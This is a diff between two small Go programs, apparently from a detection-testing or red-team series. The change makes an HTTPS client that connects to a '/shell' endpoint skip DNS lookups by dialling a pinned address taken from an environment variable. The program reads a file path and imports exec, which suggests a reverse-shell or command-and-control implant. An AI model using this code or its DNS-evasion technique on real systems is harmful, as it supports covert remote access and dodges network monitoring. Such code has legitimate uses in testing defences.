@@ -1,0 +1,62 @@
+--- ../comms_over_https/comms_over_https.go	Sat Sep  7 18:45:54 2024
++++ comms_without_dns.go	Sat Sep  7 18:45:54 2024
+@@ -1,9 +1,9 @@
+-// Program comms_over_https - coms_over_tls but uses HTTPS
++// Program comms_without_dns - coms_over_https but without a DNS lookup
+ package main
+ 
+ /*
+- * comms_over_https.go
+- * Like comms_over_tls but with HTTPS
++ * comms_without_dns.go
++ * comms_over_https but without a DNS lookup
+  * By J. Stuart McMurray
+  * Created 20240905
+  * Last Modified 20240906
+@@ -11,10 +11,12 @@
+ 
+ import (
+ 	"cmp"
++	"context"
+ 	"errors"
+ 	"fmt"
+ 	"io"
+ 	"log"
++	"net"
+ 	"net/http"
+ 	"os"
+ 	"os/exec"
+@@ -23,10 +25,11 @@
+ 
+ // Compile-time configurables
+ var (
+-	Address       = "https://localhost:4444/shell"
+-	AddressEnvVar = "ALPT4ATS_ADDRESS"
+-	File          = "/etc/hosts"
+-	FileEnvVar    = "ALPT4ATS_FILE"
++	Address           = "https://localhost:4444/shell"
++	AddressEnvVar     = "ALPT4ATS_ADDRESS"
++	File              = "/etc/hosts"
++	FileEnvVar        = "ALPT4ATS_FILE"
++	RealAddressEnvVar = "ALPT4ATS_REAL_ADDRESS"
+ )
+ 
+ // ConfFD is the file descriptor from which we might read our config.
+@@ -45,6 +48,17 @@
+ 	); nil != err && !errors.Is(err, io.EOF) &&
+ 		!errors.Is(err, syscall.EBADF) {
+ 		log.Fatalf("Error reading config from FD %d: %s", ConfFD, err)
++	}
++
++	/* Don't do DNS resolution if we have a real address already. */
++	if ra, ok := os.LookupEnv(RealAddressEnvVar); ok {
++		dial := func(
++			ctx context.Context,
++			network, addr string,
++		) (net.Conn, error) {
++			return (&net.Dialer{}).DialContext(ctx, network, ra)
++		}
++		http.DefaultTransport.(*http.Transport).DialContext = dial
+ 	}
+ 
+ 	/* Connect to the server. */
